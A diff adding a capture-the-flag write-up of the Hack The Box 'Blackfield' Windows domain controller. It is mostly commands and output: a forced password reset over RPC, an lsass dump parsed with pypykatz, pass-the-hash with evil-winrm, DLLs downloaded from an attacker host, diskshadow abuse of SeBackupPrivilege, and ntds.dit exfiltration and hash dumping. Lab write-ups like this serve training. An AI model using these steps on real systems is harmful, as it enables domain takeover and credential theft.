@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-windows
     weight: 10
 hero: images/blackfield.png
-tags: ["HTB"]
+tags: ["HTB", "dns", "ldap", "ldapsearch", "crackmapexec", "smbmap", "smbclient", "as-rep-roast", "hashcat", "bloodhound", "bloodhound-py", "rpc-password-reset", "pypykatz", "evil-winrm", "sebackupprivilege", "copy-filesepackupprivilege", "diskshadow", "ntds", "vss", "secretsdump"]
 ---
 
 # Blackfield
@@ -560,4 +560,578 @@ Hardware.Mon.#1..: Util: 91%
 Started: Sun Sep 17 19:11:49 2023
 Stopped: Sun Sep 17 19:12:05 2023
                                      
+```
+
+- The creds are valid
+  - But no `winrm` access
+```
+└─$ crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
+```
+```
+└─$ crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'                               
+SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
+HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
+WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD.local\support:#00^BlackKnight
+```
+## User #1
+- Nothing new in `smb` except for `SYSVOL` and `NETLOGON`
+
+```
+└─$ smbmap -u support -p '#00^BlackKnight' -H 10.10.10.192 
+[+] IP: 10.10.10.192:445        Name: BLACKFIELD.local                                  
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        forensic                                                NO ACCESS       Forensic / Audit share.
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        profiles$                                               READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share
+```
+- No `Kerberoastable` users
+```
+└─$ impacket-GetUserSPNs blackfield.local/'support':'#00^BlackKnight' -dc-ip dc01.blackfield.local -request                          
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+No entries found!
+
+```
+
+- `ldapsearch` to retrieve `samaccountname` of domain controller
+```
+└─$ ldapsearch -H ldap://10.10.10.192 -x -b "DC=blackfield,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight'
+# extended LDIF
+#
+# LDAPv3
+# base <DC=blackfield,DC=local> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# BLACKFIELD.local
+dn: DC=BLACKFIELD,DC=local
+objectClass: top
+objectClass: domain
+objectClass: domainDNS
+...
+dn: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+objectClass: computer
+cn: DC01
+distinguishedName: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
+instanceType: 4
+whenCreated: 20200223111400.0Z
+whenChanged: 20230918021908.0Z
+uSNCreated: 12293
+uSNChanged: 233542
+name: DC01
+objectGUID:: yKWttevtGU+AkuFOUWYvng==
+userAccountControl: 532480
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132269516749519355
+lastLogoff: 0
+lastLogon: 133395347215321691
+localPolicyFlags: 0
+pwdLastSet: 133394771382736467
+primaryGroupID: 516
+objectSid:: AQUAAAAAAAUVAAAA3sEE+lnfq4Ei72nU6AMAAA==
+accountExpires: 9223372036854775807
+logonCount: 134
+sAMAccountName: DC01$
+sAMAccountType: 805306369
+operatingSystem: Windows Server 2019 Standard
+operatingSystemVersion: 10.0 (17763)
+serverReferenceBL: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=C
+ onfiguration,DC=BLACKFIELD,DC=local
+dNSHostName: DC01.BLACKFIELD.local
+...
+```
+
+- Let's launch bloodhound
+```
+└─$ bloodhound-python -c all -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192 --zip
+INFO: Found AD domain: blackfield.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 18 computers
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 316 users
+INFO: Found 52 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+```
+
+- `support` has `ForceChangePassword` rights over `audit2020`
+
+![](./images/1.png)
+
+- Let's change `audit2020`'s password via `RPC`
+  - https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
+  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword
+
+```
+└─$ rpcclient -U blackfield.local/support dc01.blackfield.local 
+Password for [BLACKFIELD.LOCAL\support]:
+rpcclient $> setuserinfo2 audit2020 23 P@ssw0rd!@#
+rpcclient $> 
+
+```
+```
+└─$ crackmapexec smb 10.10.10.192 -u audit2020 -p 'P@ssw0rd!@#'                                           
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:P@ssw0rd!@# 
+```
+
+- But no `winrm`
+```
+└─$ crackmapexec winrm 10.10.10.192 -u audit2020 -p 'P@ssw0rd!@#'
+SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
+HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
+WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD.local\audit2020:P@ssw0rd!@#
+```
+## ## User #2
+- But we have access to `forensic`
+```
+└─$ smbmap -u audit2020 -p 'P@ssw0rd!@#' -H 10.10.10.192 
+[+] IP: 10.10.10.192:445        Name: BLACKFIELD.local                                  
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        forensic                                                READ ONLY       Forensic / Audit share.
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        profiles$                                               READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share 
+                                                                         
+```
+
+- Let's check the content
+```
+└─$ smbmap -u audit2020 -p 'P@ssw0rd!@#' -H 10.10.10.192 -R 'forensic'
+[+] IP: 10.10.10.192:445        Name: BLACKFIELD.local                                  
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        forensic                                                READ ONLY
+        .\forensic\*
+        dr--r--r--                0 Sun Feb 23 15:10:16 2020    .
+        dr--r--r--                0 Sun Feb 23 15:10:16 2020    ..
+        dr--r--r--                0 Sun Feb 23 18:14:37 2020    commands_output
+        dr--r--r--                0 Thu May 28 21:29:24 2020    memory_analysis
+        dr--r--r--                0 Fri Feb 28 22:30:34 2020    tools
+        .\forensic\commands_output\*
+        dr--r--r--                0 Sun Feb 23 18:14:37 2020    .
+        dr--r--r--                0 Sun Feb 23 18:14:37 2020    ..
+        fr--r--r--              528 Sun Feb 23 18:12:54 2020    domain_admins.txt
+        fr--r--r--              962 Sun Feb 23 18:12:54 2020    domain_groups.txt
+        fr--r--r--            16454 Fri Feb 28 22:32:17 2020    domain_users.txt
+        fr--r--r--           518202 Sun Feb 23 18:12:54 2020    firewall_rules.txt
+        fr--r--r--             1782 Sun Feb 23 18:12:54 2020    ipconfig.txt
+        fr--r--r--             3842 Sun Feb 23 18:12:54 2020    netstat.txt
+        fr--r--r--             3976 Sun Feb 23 18:12:54 2020    route.txt
+        fr--r--r--             4550 Sun Feb 23 18:12:54 2020    systeminfo.txt
+        fr--r--r--             9990 Sun Feb 23 18:12:54 2020    tasklist.txt
+        .\forensic\memory_analysis\*
+        dr--r--r--                0 Thu May 28 21:29:24 2020    .
+        dr--r--r--                0 Thu May 28 21:29:24 2020    ..
+        fr--r--r--         37876530 Thu May 28 21:29:24 2020    conhost.zip
+        fr--r--r--         24962333 Thu May 28 21:29:24 2020    ctfmon.zip
+        fr--r--r--         23993305 Thu May 28 21:29:24 2020    dfsrs.zip
+        fr--r--r--         18366396 Thu May 28 21:29:24 2020    dllhost.zip
+        fr--r--r--          8810157 Thu May 28 21:29:24 2020    ismserv.zip
+        fr--r--r--         41936098 Thu May 28 21:29:24 2020    lsass.zip
+        fr--r--r--         64288607 Thu May 28 21:29:24 2020    mmc.zip
+        fr--r--r--         13332174 Thu May 28 21:29:24 2020    RuntimeBroker.zip
+        fr--r--r--        131983313 Thu May 28 21:29:24 2020    ServerManager.zip
+        fr--r--r--         33141744 Thu May 28 21:29:24 2020    sihost.zip
+        fr--r--r--         33756344 Thu May 28 21:29:24 2020    smartscreen.zip
+        fr--r--r--         14408833 Thu May 28 21:29:24 2020    svchost.zip
+        fr--r--r--         34631412 Thu May 28 21:29:24 2020    taskhostw.zip
+        fr--r--r--         14255089 Thu May 28 21:29:24 2020    winlogon.zip
+        fr--r--r--          4067425 Thu May 28 21:29:24 2020    wlms.zip
+        fr--r--r--         18303252 Thu May 28 21:29:24 2020    WmiPrvSE.zip
+...
+```
+
+- We have `lsass` file in `memory_analysis` folder
+  - Let's check it
+```
+└─$ smbclient //10.10.10.192/forensic -U 'audit2020%P@ssw0rd!@#' 
+Try "help" to get a list of possible commands.
+smb: \> cd memory_analysis\
+smb: \memory_analysis\> get lsass.zip 
+parallel_read returned NT_STATUS_IO_TIMEOUT
+smb: \memory_analysis\> getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip SMBecho failed (NT_STATUS_CONNECTION_DISCONNECTED). The connection is disconnected now
+```
+
+- To solve this issue we can mount the share
+```
+└─$ sudo mount -t cifs -o 'username=audit2020,password=P@ssw0rd!@#' //10.10.10.192/forensic/memory_analysis /mnt/smb/ 
+```
+```
+└─$ ls /mnt/smb 
+conhost.zip  ctfmon.zip  dfsrs.zip  dllhost.zip  ismserv.zip  lsass.zip  mmc.zip  RuntimeBroker.zip  ServerManager.zip  sihost.zip  smartscreen.zip  svchost.zip  taskhostw.zip  winlogon.zip  wlms.zip  WmiPrvSE.zip     
+```
+```
+└─$ cp /mnt/smb/lsass.zip ./
+```
+
+- Unzip the memory dump and pass it to `pypykatz`
+  - https://github.com/skelsec/pypykatz
+```
+└─$ pypykatz lsa minidump lsass.DMP
+INFO:pypykatz:Parsing file lsass.DMP
+FILE: ======== lsass.DMP =======
+== LogonSession ==
+authentication_id 406458 (633ba)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+        == MSV ==
+                Username: svc_backup
+                Domain: BLACKFIELD
+                LM: NA
+                NT: 9658d1d1dcd9250115e2205d9f48400d
+                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
+        == WDIGEST [633ba]==
+                username svc_backup
+                domainname BLACKFIELD
+                password None
+                password (hex)
+        == Kerberos ==
+                Username: svc_backup
+                Domain: BLACKFIELD.LOCAL
+        == WDIGEST [633ba]==
+                username svc_backup
+                domainname BLACKFIELD
+                password None
+                password (hex)
+...
+```
+
+- Now we can `winrm` using the hash
+```
+└─$ crackmapexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
+HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
+WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
+```
+```
+└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> 
+
+```
+## Root
+- We have a note in `C:\`
+```
+*Evil-WinRM* PS C:\> type notes.txt
+Mates,
+
+After the domain compromise and computer forensic last week, auditors advised us to:
+- change every passwords -- Done.
+- change krbtgt password twice -- Done.
+- disable auditor's account (audit2020) -- KO.
+- use nominative domain admin accounts instead of this one -- KO.
+
+We will probably have to backup & restore things later.
+- Mike.
+
+PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
+```
+- `whoami`
+```
+*Evil-WinRM* PS C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+```
+
+- We have `SeBackupPrivilege` and we are [Backup Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators)
+  - Download the [dlls](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
+  - Follow one of these posts:
+    - https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
+    - https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/
+    - https://juggernaut-sec.com/sebackupprivilege/
+  - Let's try `reg save` to download `system` and `sam` and then `pypykatz` or `secretsdump`
+
+```
+*Evil-WinRM* PS C:\> reg save hklm\sam C:\ProgramData\SAM
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\> reg save hklm\SYSTEM C:\ProgramData\SYSTEM
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\programdata> download sam
+                                        
+Info: Downloading C:\programdata\sam to sam
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\programdata> download system
+                                        
+Info: Downloading C:\programdata\system to system
+                                        
+Info: Download successful!
+
+```
+```
+└─$ pypykatz registry --sam sam system
+WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
+WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
+============== SYSTEM hive secrets ==============
+CurrentControlSet: ControlSet001
+Boot Key: 73d83e56de8961ca9f243e1a49638393
+============== SAM hive secrets ==============
+HBoot Key: 1d645695662cc2a70d54ee626104485110101010101010101010101010101010
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+- Or
+```
+└─$ impacket-secretsdump -sam sam -system system local
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Cleaning up... 
+```
+
+- But we can't `winrm` as `Administrator`
+```
+└─$ evil-winrm -i 10.10.10.192 -u administrator -H 67ef902eae0d740df6257f273de75051
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+                                        
+Error: Exiting with code 1
+
+```
+- Let's try `dll` method
+```
+*Evil-WinRM* PS C:\users\svc_backup> iwr 10.10.16.9/SeBackupPrivilegeCmdLets.dll -outfile SeBackupPrivilegeCmdLets.dll
+*Evil-WinRM* PS C:\users\svc_backup> iwr 10.10.16.9/SeBackupPrivilegeUtils.dll -outfile SeBackupPrivilegeUtils.dll
+*Evil-WinRM* PS C:\users\svc_backup> ls
+
+
+    Directory: C:\users\svc_backup
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        2/23/2020   9:16 AM                3D Objects
+d-r---        2/23/2020   9:16 AM                Contacts
+d-r---        2/28/2020   2:26 PM                Desktop
+d-r---        2/23/2020   9:16 AM                Documents
+d-r---        2/23/2020   9:16 AM                Downloads
+d-r---        2/23/2020   9:16 AM                Favorites
+d-r---        2/23/2020   9:16 AM                Links
+d-r---        2/23/2020   9:16 AM                Music
+d-r---        2/23/2020   9:16 AM                Pictures
+d-r---        2/23/2020   9:16 AM                Saved Games
+d-r---        2/23/2020   9:16 AM                Searches
+d-r---        2/23/2020   9:16 AM                Videos
+-a----        9/18/2023   4:35 PM          12288 SeBackupPrivilegeCmdLets.dll
+-a----        9/18/2023   4:36 PM          16384 SeBackupPrivilegeUtils.dll
+
+
+*Evil-WinRM* PS C:\users\svc_backup> import-module .\SeBackupPrivilegeCmdLets.dll
+*Evil-WinRM* PS C:\users\svc_backup> Import-Module .\SeBackupPrivilegeUtils.dll
+*Evil-WinRM* PS C:\users\svc_backup> Copy-FileSeBackupPrivilege c:\windows\ntds\ntds.dit c:\users\svc_backup\downloads\ntds.dit -overwrite
+Opening input file. - The process cannot access the file because it is being used by another process. (Exception from HRESULT: 0x80070020)
+At line:1 char:1
++ Copy-FileSeBackupPrivilege c:\windows\ntds\ntds.dit c:\users\svc_back ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception
+    + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege
+
+```
+
+- Another fail
+  - Let's try [diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)
+  - The payload from [this post](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration)
+  - Set alias to `trophy`
+```
+set context persistent nowriters
+set metadata c:\programdata\metadata.cab
+add volume c: alias trophy
+create
+expose %trophy% z:
+```
+```
+*Evil-WinRM* PS C:\users\svc_backup> diskshadow.exe /s C:\users\svc_backup\diskshadow.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  9/18/2023 5:02:10 PM
+
+-> set context persistent nowriters
+-> set metadata c:\programdata\metadata.cab
+The existing file will be overwritten.
+-> add volume c: alias trophy
+-> create
+Alias trophy for shadow ID {f5e81929-aad5-44f9-87f9-4aa66006c3ef} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {94c54815-47e8-46fc-b1e7-f1caa65770ba} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {94c54815-47e8-46fc-b1e7-f1caa65770ba}
+
+        * Shadow copy ID = {f5e81929-aad5-44f9-87f9-4aa66006c3ef}               %trophy%
+                - Shadow copy set: {94c54815-47e8-46fc-b1e7-f1caa65770ba}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
+                - Creation time: 9/18/2023 5:02:11 PM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+                - Originating machine: DC01.BLACKFIELD.local
+                - Service machine: DC01.BLACKFIELD.local
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %trophy% z:
+-> %trophy% = {f5e81929-aad5-44f9-87f9-4aa66006c3ef}
+The shadow copy was successfully exposed as z:\.
+->
+
+```
+
+- Copy and download the `ntds.dit`
+```
+*Evil-WinRM* PS C:\users\svc_backup> Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit .\ntds.dit
+*Evil-WinRM* PS C:\users\svc_backup> ls
+
+
+    Directory: C:\users\svc_backup
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        2/23/2020   9:16 AM                3D Objects
+d-r---        2/23/2020   9:16 AM                Contacts
+d-r---        2/28/2020   2:26 PM                Desktop
+d-r---        2/23/2020   9:16 AM                Documents
+d-r---        2/23/2020   9:16 AM                Downloads
+d-r---        2/23/2020   9:16 AM                Favorites
+d-r---        2/23/2020   9:16 AM                Links
+d-r---        2/23/2020   9:16 AM                Music
+d-r---        2/23/2020   9:16 AM                Pictures
+d-r---        2/23/2020   9:16 AM                Saved Games
+d-r---        2/23/2020   9:16 AM                Searches
+d-r---        2/23/2020   9:16 AM                Videos
+-a----        9/18/2023   5:02 PM            132 diskshadow.txt
+-a----        9/18/2023   5:02 PM       18874368 ntds.dit
+-a----        9/18/2023   4:35 PM          12288 SeBackupPrivilegeCmdLets.dll
+-a----        9/18/2023   4:36 PM          16384 SeBackupPrivilegeUtils.dll
+-a----        9/18/2023   4:56 PM            272 shadow.txt
+
+
+*Evil-WinRM* PS C:\users\svc_backup> download ntds.dit
+                                        
+Info: Downloading C:\users\svc_backup\ntds.dit to ntds.dit
+                                        
+Info: Download successful!
+
+```
+
+- Now we use `impacket-secretsdump`
+```
+└─$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+...
+```
+
+- And now we can `winrm` as `Administrator` using his hash
+```
+└─$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+
 ```
